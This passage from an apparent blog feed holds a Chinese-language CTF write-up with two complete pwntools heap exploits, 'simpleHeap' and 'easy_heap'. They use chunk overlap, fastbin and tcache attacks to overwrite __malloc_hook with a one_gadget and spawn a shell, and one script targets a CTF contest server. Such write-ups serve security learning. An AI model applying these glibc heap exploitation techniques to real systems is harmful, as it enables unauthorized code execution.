class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
